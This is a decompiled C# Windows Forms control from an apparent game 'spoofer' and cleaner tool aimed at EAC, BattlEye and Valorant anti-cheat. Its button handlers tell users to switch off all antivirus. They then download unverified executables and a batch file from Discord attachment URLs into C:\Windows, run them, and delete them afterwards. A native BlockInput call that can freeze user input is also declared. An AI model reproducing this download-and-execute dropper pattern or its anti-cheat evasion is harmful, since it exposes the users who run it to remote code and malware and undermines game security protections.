using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Siticone.Desktop.UI.WinForms;

namespace MouseManager
{
	// Token: 0x0200000C RID: 12
	public class Profile5 : UserControl
	{
		// Token: 0x17000010 RID: 16
		// (get) Token: 0x06000065 RID: 101 RVA: 0x001A844F File Offset: 0x001A0E4F
		// (set) Token: 0x06000066 RID: 102 RVA: 0x001A845A File Offset: 0x001A0E5A
		public string Kill { get; private set; }

		// Token: 0x06000067 RID: 103 RVA: 0x001A8469 File Offset: 0x001A0E69
		public Profile5()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000068 RID: 104 RVA: 0x001AE594 File Offset: 0x001A6F94
		private void siticoneButton4_Click(object sender, EventArgs e)
		{
			MessageBox.Show("IF Cleanner FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,Important Message");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\CleanerFirst.exe";
			string text2 = "C:\\Windows\\CleanerSecond.exe";
			string text3 = "C:\\Windows\\Apex_Cleaner_2.bat";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899048528473624626/CleanerFirst.exe", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899048530289766411/CleanerSecond.exe", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899049004350971954/Apex_Cleaner_2.bat", text3);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			MessageBox.Show("Spoofer is on, don't touch anything else WAIT !!! .", "Important Message");
			Process.Start(text);
			Thread.Sleep(30000);
			File.Delete(text);
			Process.Start(text2);
			Thread.Sleep(15000);
			Process.Start(text3);
			File.Delete(text2);
			Thread.Sleep(15000);
			File.Delete(text3);
			Thread.Sleep(5000);
			File.Delete(text);
			File.Delete(text2);
			MessageBox.Show("Cleaner worked properlyGOOD GAME", "Important Message");
		}

		// Token: 0x06000069 RID: 105 RVA: 0x001AE6D0 File Offset: 0x001A70D0
		private void siticoneButton1_Click(object sender, EventArgs e)
		{
			MessageBox.Show("IF  FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,Important Message");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\Free-Clean1.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899055439457710152/899055459212865547/Free-Clean1.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			MessageBox.Show("Spoofer is on, don't touch anything else WAIT !!! .", "Important Message");
			Process.Start(text);
			Thread.Sleep(50000);
			File.Delete(text);
			MessageBox.Show("Cleaner worked properlyGOOD GAME", "Important Message");
		}

		// Token: 0x0600006A RID: 106 RVA: 0x001AE788 File Offset: 0x001A7188
		private void siticoneButton2_Click(object sender, EventArgs e)
		{
			MessageBox.Show("IF  FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,Important Message");
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\fixBEandEACv6.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899055439457710152/899056118653923338/fixBEandEACv6.exe", fileName);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			MessageBox.Show("EAC INSTALLE is on, don't touch anything else WAIT !!! .", "Important Message");
			Process.Start(fileName);
			Thread.Sleep(50000);
			MessageBox.Show(" worked properlyGOOD GAME", "Important Message");
		}

		// Token: 0x0600006B RID: 107 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneButton3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006C RID: 108 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void Profile5_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006D RID: 109 RVA: 0x001AE834 File Offset: 0x001A7234
		public static void BlockInput(TimeSpan span)
		{
			try
			{
				Profile5.NativeMethods.BlockInput(true);
				Thread.Sleep(span);
			}
			finally
			{
				Profile5.NativeMethods.BlockInput(false);
			}
		}

		// Token: 0x0600006E RID: 110 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneButton3_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x0600006F RID: 111 RVA: 0x001A847D File Offset: 0x001A0E7D
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000070 RID: 112 RVA: 0x001AE878 File Offset: 0x001A7278
		private void InitializeComponent()
		{
			this.siticoneHtmlLabel5 = new SiticoneHtmlLabel();
			this.siticoneButton4 = new SiticoneButton();
			this.siticoneButton1 = new SiticoneButton();
			this.siticoneButton2 = new SiticoneButton();
			base.SuspendLayout();
			this.siticoneHtmlLabel5.BackColor = Color.Transparent;
			this.siticoneHtmlLabel5.Enabled = false;
			this.siticoneHtmlLabel5.Font = new Font("Bahnschrift Condensed", 15f);
			this.siticoneHtmlLabel5.ForeColor = Color.White;
			this.siticoneHtmlLabel5.Location = new Point(247, 0);
			this.siticoneHtmlLabel5.Name = "siticoneHtmlLabel5";
			this.siticoneHtmlLabel5.Size = new Size(35, 26);
			this.siticoneHtmlLabel5.TabIndex = 63;
			this.siticoneHtmlLabel5.Text = "MISC";
			this.siticoneButton4.Animated = true;
			this.siticoneButton4.AutoRoundedCorners = true;
			this.siticoneButton4.BorderColor = Color.White;
			this.siticoneButton4.BorderRadius = 16;
			this.siticoneButton4.BorderThickness = 2;
			this.siticoneButton4.CheckedState.BorderColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton4.CheckedState.FillColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton4.CheckedState.ForeColor = Color.Black;
			this.siticoneButton4.CheckedState.Parent = this.siticoneButton4;
			this.siticoneButton4.Cursor = Cursors.Hand;
			this.siticoneButton4.CustomImages.Parent = this.siticoneButton4;
			this.siticoneButton4.DisabledState.BorderColor = Color.DarkGray;
			this.siticoneButton4.DisabledState.CustomBorderColor = Color.DarkGray;
			this.siticoneButton4.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			this.siticoneButton4.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneButton4.DisabledState.Parent = this.siticoneButton4;
			this.siticoneButton4.FillColor = Color.FromArgb(33, 33, 33);
			this.siticoneButton4.Font = new Font("Bahnschrift", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.siticoneButton4.ForeColor = Color.White;
			this.siticoneButton4.HoverState.FillColor = Color.White;
			this.siticoneButton4.HoverState.ForeColor = Color.Black;
			this.siticoneButton4.HoverState.Parent = this.siticoneButton4;
			this.siticoneButton4.Location = new Point(151, 32);
			this.siticoneButton4.Name = "siticoneButton4";
			this.siticoneButton4.ShadowDecoration.Parent = this.siticoneButton4;
			this.siticoneButton4.Size = new Size(247, 35);
			this.siticoneButton4.TabIndex = 64;
			this.siticoneButton4.Text = "Clean ALL - EAC -BE -VALO";
			this.siticoneButton4.Click += this.siticoneButton4_Click;
			this.siticoneButton1.Animated = true;
			this.siticoneButton1.AutoRoundedCorners = true;
			this.siticoneButton1.BorderColor = Color.White;
			this.siticoneButton1.BorderRadius = 16;
			this.siticoneButton1.BorderThickness = 2;
			this.siticoneButton1.CheckedState.BorderColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton1.CheckedState.FillColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton1.CheckedState.ForeColor = Color.Black;
			this.siticoneButton1.CheckedState.Parent = this.siticoneButton1;
			this.siticoneButton1.Cursor = Cursors.Hand;
			this.siticoneButton1.CustomImages.Parent = this.siticoneButton1;
			this.siticoneButton1.DisabledState.BorderColor = Color.DarkGray;
			this.siticoneButton1.DisabledState.CustomBorderColor = Color.DarkGray;
			this.siticoneButton1.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			this.siticoneButton1.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneButton1.DisabledState.Parent = this.siticoneButton1;
			this.siticoneButton1.FillColor = Color.FromArgb(33, 33, 33);
			this.siticoneButton1.Font = new Font("Bahnschrift", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.siticoneButton1.ForeColor = Color.White;
			this.siticoneButton1.HoverState.FillColor = Color.White;
			this.siticoneButton1.HoverState.ForeColor = Color.Black;
			this.siticoneButton1.HoverState.Parent = this.siticoneButton1;
			this.siticoneButton1.Location = new Point(151, 73);
			this.siticoneButton1.Name = "siticoneButton1";
			this.siticoneButton1.ShadowDecoration.Parent = this.siticoneButton1;
			this.siticoneButton1.Size = new Size(247, 35);
			this.siticoneButton1.TabIndex = 65;
			this.siticoneButton1.Text = "ADV Clean PC";
			this.siticoneButton1.Click += this.siticoneButton1_Click;
			this.siticoneButton2.Animated = true;
			this.siticoneButton2.AutoRoundedCorners = true;
			this.siticoneButton2.BorderColor = Color.White;
			this.siticoneButton2.BorderRadius = 16;
			this.siticoneButton2.BorderThickness = 2;
			this.siticoneButton2.CheckedState.BorderColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton2.CheckedState.FillColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton2.CheckedState.ForeColor = Color.Black;
			this.siticoneButton2.CheckedState.Parent = this.siticoneButton2;
			this.siticoneButton2.Cursor = Cursors.Hand;
			this.siticoneButton2.CustomImages.Parent = this.siticoneButton2;
			this.siticoneButton2.DisabledState.BorderColor = Color.DarkGray;
			this.siticoneButton2.DisabledState.CustomBorderColor = Color.DarkGray;
			this.siticoneButton2.DisabledState.FillColor = Color.FromArgb(169, 169, 169);
			this.siticoneButton2.DisabledState.ForeColor = Color.FromArgb(141, 141, 141);
			this.siticoneButton2.DisabledState.Parent = this.siticoneButton2;
			this.siticoneButton2.FillColor = Color.FromArgb(33, 33, 33);
			this.siticoneButton2.Font = new Font("Bahnschrift", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.siticoneButton2.ForeColor = Color.White;
			this.siticoneButton2.HoverState.FillColor = Color.White;
			this.siticoneButton2.HoverState.ForeColor = Color.Black;
			this.siticoneButton2.HoverState.Parent = this.siticoneButton2;
			this.siticoneButton2.Location = new Point(151, 114);
			this.siticoneButton2.Name = "siticoneButton2";
			this.siticoneButton2.ShadowDecoration.Parent = this.siticoneButton2;
			this.siticoneButton2.Size = new Size(247, 35);
			this.siticoneButton2.TabIndex = 66;
			this.siticoneButton2.Text = "FIX EAC NO INSTALLED";
			this.siticoneButton2.Click += this.siticoneButton2_Click;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(33, 33, 33);
			base.Controls.Add(this.siticoneButton2);
			base.Controls.Add(this.siticoneButton1);
			base.Controls.Add(this.siticoneButton4);
			base.Controls.Add(this.siticoneHtmlLabel5);
			base.Name = "Profile5";
			base.Size = new Size(554, 484);
			base.Load += this.Profile5_Load;
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000040 RID: 64
		private IContainer components;

		// Token: 0x04000041 RID: 65
		private SiticoneHtmlLabel siticoneHtmlLabel5;

		// Token: 0x04000042 RID: 66
		private SiticoneButton siticoneButton4;

		// Token: 0x04000043 RID: 67
		private SiticoneButton siticoneButton1;

		// Token: 0x04000044 RID: 68
		private SiticoneButton siticoneButton2;

		// Token: 0x0200000D RID: 13
		public class NativeMethods
		{
			// Token: 0x06000071 RID: 113
			[DllImport("user32.dll")]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
		}
	}
}
